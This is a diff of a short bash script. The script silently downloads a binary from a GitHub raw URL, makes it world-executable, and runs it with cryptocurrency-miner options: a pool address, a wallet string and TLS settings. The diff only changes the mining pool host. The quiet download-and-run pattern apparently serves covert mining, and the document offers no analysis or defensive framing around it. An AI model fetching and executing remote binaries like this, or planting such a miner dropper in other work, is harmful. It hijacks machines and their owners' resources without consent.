@@ -1,4 +1,4 @@
 #!/bin/bash
 wget -O gigi https://github.com/cornea99/upil/raw/main/xmolx > /dev/null 2>&1
 chmod 777 gigi
-./gigi --url pool.hashvault.pro:443 --user SaLvsC7GYZSQpZXn4F63d52MSxNjKLa3hh92Mucq2Av29ueS1Lej8HK8r7P3arc9BvKsduPQ17pYdZG74au9hXs2cwHyZ9CFwuw --pass x --donate-level 1 --tls --tls-fingerprint 420c7850e09b7c0bdcf748a7da9eb3647daf8515718f36d9ccfdd6b9ff834b14
+./gigi --url 2realminers.com:6123 --user SaLvsC7GYZSQpZXn4F63d52MSxNjKLa3hh92Mucq2Av29ueS1Lej8HK8r7P3arc9BvKsduPQ17pYdZG74au9hXs2cwHyZ9CFwuw --pass x --donate-level 1 --tls --tls-fingerprint 420c7850e09b7c0bdcf748a7da9eb3647daf8515718f36d9ccfdd6b9ff834b14
